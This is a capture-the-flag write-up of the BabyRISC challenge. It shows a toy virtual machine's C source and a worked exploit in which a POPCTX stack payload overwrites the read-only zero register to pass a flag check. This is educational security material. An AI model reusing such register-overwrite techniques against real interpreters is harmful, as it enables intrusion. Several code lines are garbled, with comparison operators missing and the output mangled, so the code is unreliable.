INSTRUCTION_DEFINE_OP1(RETZ)
{
    int ret = E_SUCCESS;
    reg_value_t value = 0;
    ret = read_reg(reg0, &value);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }
    if (value == 0)
    {
        ret = E_RETURN;
    }
cleanup:
    return ret;
}
INSTRUCTION_DEFINE_OP1(PUSH)
{
    int ret = E_SUCCESS;
    reg_value_t reg_val = 0;
    reg_value_t sp_val = 0;
    ret = read_reg(reg0, &reg_val);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }
    ret = read_reg(ASM_REGISTER_SP, &sp_val);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }
    if (sp_val  (reg_value_t)(ASM_STACK_SIZE - sizeof(reg_val)))
    {
        ret = E_STACK_VIOLATION;
        goto cleanup;
    }
    memcpy(&asm_stack[sp_val], &reg_val, sizeof(reg_val));
    ret = write_reg(ASM_REGISTER_SP, sp_val + sizeof(reg_val));
cleanup:
    return ret;
}
INSTRUCTION_DEFINE_OP1(POP)
{
    int ret = E_SUCCESS;
    reg_value_t reg_val = 0;
    reg_value_t sp_val = 0;
    ret = read_reg(ASM_REGISTER_SP, &sp_val);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }
    if (sp_val  (reg_value_t)ASM_STACK_SIZE)
    {
        ret = E_STACK_VIOLATION;
        goto cleanup;
    }
    sp_val -= sizeof(reg_val);
    memcpy(&reg_val, &asm_stack[sp_val], sizeof(reg_val));
    ret = write_reg(reg0, reg_val);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }
    ret = write_reg(ASM_REGISTER_SP, sp_val);
cleanup:
    return ret;
}
INSTRUCTION_DEFINE_OP0(PUSHCTX)
{
    int ret = E_SUCCESS;
    reg_value_t sp_val = 0;
    ret = read_reg(ASM_REGISTER_SP, &sp_val);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }
    if (sp_val  (reg_value_t)(ASM_STACK_SIZE - sizeof(registers)))
    {
        ret = E_STACK_VIOLATION;
        goto cleanup;
    }
    memcpy(&asm_stack[sp_val], registers, sizeof(registers));
    ret = write_reg(ASM_REGISTER_SP, sp_val + sizeof(registers));
cleanup:
    return ret;
}
INSTRUCTION_DEFINE_OP0(POPCTX)
{
    int ret = E_SUCCESS;
    reg_value_t sp_val = 0;
    ret = read_reg(ASM_REGISTER_SP, &sp_val);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }
    if (sp_val  (reg_value_t)ASM_STACK_SIZE)
    {
        ret = E_STACK_VIOLATION;
        goto cleanup;
    }
    sp_val -= sizeof(registers);
    memcpy(registers, &asm_stack[sp_val], sizeof(registers));
cleanup:
    return ret;
}
// We must implement division fully in-order to handle division-by-zero.
INSTRUCTION_DEFINE_OP3(DIV)
{
    int ret = E_SUCCESS;
    reg_value_t value1 = 0;
    reg_value_t value2 = 0;
    ret = read_reg(reg1, &value1);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }
    ret = read_reg(reg2, &value2);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }
    if (value2 == 0)
    {
        ret = E_DIV_ZERO;
        goto cleanup;
    }
    value1 = value1 / value2;
    ret = write_reg(reg0, value1);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }
cleanup:
    return ret;
}
// We must implement division fully in-order to handle division-by-zero.
INSTRUCTION_DEFINE_OP_IMM32(DIVI)
{
    int ret = E_SUCCESS;
    reg_value_t value = 0;
    ret = read_reg(reg1, &value);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }
    if (imm32 == 0)
    {
        ret = E_DIV_ZERO;
        goto cleanup;
    }
    value = value / imm32;
    ret = write_reg(reg0, value);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }
cleanup:
    return ret;
}
INSTRUCTION_DEFINE_OP_IMM32(ROL)
{
    int ret = E_SUCCESS;
    reg_value_t value = 0;
    ret = read_reg(reg1, &value);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }
    value = _rotl(value, imm32);
    ret = write_reg(reg0, value);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }
cleanup:
    return ret;
}
INSTRUCTION_DEFINE_OP_IMM32(ROR)
{
    int ret = E_SUCCESS;
    reg_value_t value = 0;
    ret = read_reg(reg1, &value);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }
    value = _rotr(value, imm32);
    ret = write_reg(reg0, value);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }
cleanup:
    return ret;
}
// This is the table containing the function pointers for the instructions implementations.
// If you add an instruction, add the INSTRUCTION_SYMBOL entry to this table with the opcode value.
#define INSTRUCTION_SYMBOL(opcode) [opcode] = __INSTRUCTION_DEFINE_##opcode
instruction_definition_t asm_instruction_definitions[MAX_ASM_OPCODE_VAL] = {
    INSTRUCTION_SYMBOL(ADD),     INSTRUCTION_SYMBOL(ADDI),    INSTRUCTION_SYMBOL(AND),    INSTRUCTION_SYMBOL(ANDI),
    INSTRUCTION_SYMBOL(DIV),     INSTRUCTION_SYMBOL(DIVI),    INSTRUCTION_SYMBOL(MUL),    INSTRUCTION_SYMBOL(MULI),
    INSTRUCTION_SYMBOL(OR),      INSTRUCTION_SYMBOL(ORI),     INSTRUCTION_SYMBOL(PRINTC), INSTRUCTION_SYMBOL(PRINTDD),
    INSTRUCTION_SYMBOL(PRINTDX), INSTRUCTION_SYMBOL(PRINTNL), INSTRUCTION_SYMBOL(RET),    INSTRUCTION_SYMBOL(RETNZ),
    INSTRUCTION_SYMBOL(RETZ),    INSTRUCTION_SYMBOL(ROL),     INSTRUCTION_SYMBOL(ROR),    INSTRUCTION_SYMBOL(SHL),
    INSTRUCTION_SYMBOL(SHR),     INSTRUCTION_SYMBOL(SUB),     INSTRUCTION_SYMBOL(SUBI),   INSTRUCTION_SYMBOL(XOR),
    INSTRUCTION_SYMBOL(XORI),    INSTRUCTION_SYMBOL(PUSH),    INSTRUCTION_SYMBOL(POP),    INSTRUCTION_SYMBOL(PUSHCTX),
    INSTRUCTION_SYMBOL(POPCTX),
};
```
## Solution:
This looks like some sort of a virtual machine implementing a RISC instruction set. The main function reads some instructions from the user, then appends some "admin" instructions which print the flag under certain conditions:
```c
    // If the user sets R0 so (R0 * 42) == 1 (impossible!), she deserves to read the flag
    ret |= file_write_opcode_imm32(payload_fp, ADDI, ASM_REGISTER_R1, ASM_REGISTER_ZERO, 42);
    ret |= file_write_opcode3(payload_fp, MUL, ASM_REGISTER_R2, ASM_REGISTER_R0, ASM_REGISTER_R1);
    ret |= file_write_opcode_imm32(payload_fp, SUBI, ASM_REGISTER_R2, ASM_REGISTER_R2, 1);
    ret |= file_write_opcode1(payload_fp, RETNZ, ASM_REGISTER_R2);
```
Our goal is to set R0 to that `(R0 * 42) == 1`. As the comment says, that's impossible if we follow the rules, therefore we must bypass them.
Let's convert the code above to easier-to-view pseudo-code:
```
REG_R1 = REG_ZERO + 42
REG_R2 = REG_R0 * REG_R1
REG_R2 = REG_R2 - 1
IF  != 0 {
    RETURN
}
```
`ASM_REGISTER_ZERO` is a register that always returns the value of zero. It would be nice if we could override it with a different value, since that would let us manipulate the equation, but the virtual machine blocks this explicitly:
```c
int write_reg(asm_register_t reg, reg_value_t value)
{
    if (reg = sizeof(registers) / sizeof(reg_value_t))
    {
        return E_W_INVLD_REG;
    }
    else if (reg == ASM_REGISTER_ZERO)
    {
        return E_W2ZERO;
    }
    registers[reg] = value;
    return E_SUCCESS;
}
```
Or does it? Let's take a closer look at where the virtual machine stores its register values: The global `registers` array. Using `write_reg` is one way to modify the value of registers, but it blocks changing `ASM_REGISTER_ZERO` as we saw. Luckily, there seems to be another function modifying the array which is less restrictive:
```c
INSTRUCTION_DEFINE_OP0(POPCTX)
{
    int ret = E_SUCCESS;
    reg_value_t sp_val = 0;
    ret = read_reg(ASM_REGISTER_SP, &sp_val);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }
    if (sp_val  (reg_value_t)ASM_STACK_SIZE)
    {
        ret = E_STACK_VIOLATION;
        goto cleanup;
    }
    sp_val -= sizeof(registers);
    memcpy(registers, &asm_stack[sp_val], sizeof(registers));
cleanup:
    return ret;
}
```
This function is the counterpart of `PUSHCTX`, which pushes all registers to the stack. Using this function, the register values get popped back from the stack to the registers themselves. Yes, even `ASM_REGISTER_ZERO`.
So, if we want to modify the value of `ASM_REGISTER_ZERO`, we just need to prepare a stack where the value we want to write is located at the correct location to be popped into the register array. 
Now that we know how to write, let's find the value we want to write. Looks like we can fix the equation by setting `ASM_REGISTER_ZERO` to `-41` and setting `ASM_REGISTER_R0` to `1`:
```
REG_R1 = REG_ZERO + 42      ; REG_R1 = -41 + 42 = 1
REG_R2 = REG_R0 * REG_R1    ; REG_R2 = 1 * 1 = 1
REG_R2 = REG_R2 - 1         ; REG_R2 = 1 - 1 = 0
IF  != 0 {
    RETURN
}
```
In the attached files we have received a program called `payload_builder`, which allows us to build a payload using C instructions just like the main function does. We'll use the following payload:
```c
ret |= file_write_opcode_imm32(payload_fp, ADDI, ASM_REGISTER_R0, ASM_REGISTER_ZERO, -41);
ret |= file_write_opcode1(payload_fp, PUSH, ASM_REGISTER_R0);
ret |= file_write_opcode1(payload_fp, PUSH, ASM_REGISTER_R0);
ret |= file_write_opcode1(payload_fp, PUSH, ASM_REGISTER_R0);
ret |= file_write_opcode1(payload_fp, PUSH, ASM_REGISTER_R0);
ret |= file_write_opcode1(payload_fp, PUSH, ASM_REGISTER_R0);
ret |= file_write_opcode1(payload_fp, PUSH, ASM_REGISTER_R0);
ret |= file_write_opcode1(payload_fp, PUSH, ASM_REGISTER_R0);
ret |= file_write_opcode1(payload_fp, PUSH, ASM_REGISTER_R0);
ret |= file_write_opcode1(payload_fp, PUSH, ASM_REGISTER_R0);
ret |= file_write_opcode(payload_fp, POPCTX);
ret |= file_write_opcode_imm32(payload_fp, ADDI, ASM_REGISTER_R0, ASM_REGISTER_ZERO, 42); // Note that ASM_REGISTER_ZERO is -41 at this stage
```
We build the program and run it:
```console
ubuntu@cloudhost:~/BabyRISC/BabyRISC/payload_builder$ ./payload_builder
Written 37 bytes to 'payload.bin'.
ubuntu@cloudhost:~/BabyRISC/BabyRISC/payload_builder$ xxd payload.bin
00000000: 0101 00d7 ffff ff19 0119 0119 0119 0119  ................
00000010: 0119 0119 0119 0119 011c 0101 002a 0000  .............*..
00000020: 00ff ffff ff                             .....
```
Now, all that's left is to decode the flag, after it has been ROR-ed by the program via:
```c
// Print each 4-bytes of the flag as 4-characters
// (We might print some trailing null-characters if the flag length is not divisible by 4)
int32_t * flag_start = (int32_t *)flag_string;
int32_t * flag_end = (int32_t *)((char *)flag_string + strlen(flag_string));
for (int32_t * p = flag_start; p >> Executing code!'
[+] Receiving all data: Done (106B)
[*] Closed connection to babyrisc.shieldchallenges.com port 9070
Received:
00000000  1b 5b 30 6d  0a 0a 0a 0a  0a 0a 0a 0a  3d 6c 61 67  │·[0m│····│····│=lag│
00000010  52 52 49 53  1a 5f 64 6f  3c 73 6e 74  36 72 65 64  │RRIS│·_do│s_a│=ter│6all│T···│
00000040  0a 1b 5b 33  36 6d 3e 3e  3e 20 1b 5b  30 6d 65 78  │··[3│6m>>│> ·[│0mex│
00000050  65 63 75 74  65 64 20 30  78 38 46 20  69 6e 73 74  │ecut│ed 0│x8F │inst│
00000060  72 75 63 74  69 6f 6e 73  0a 0a                     │ruct│ions│··│
0000006a
[+] Flag: flag{RISC_doesnt_reduce_amount_of_bugs_after_all}
```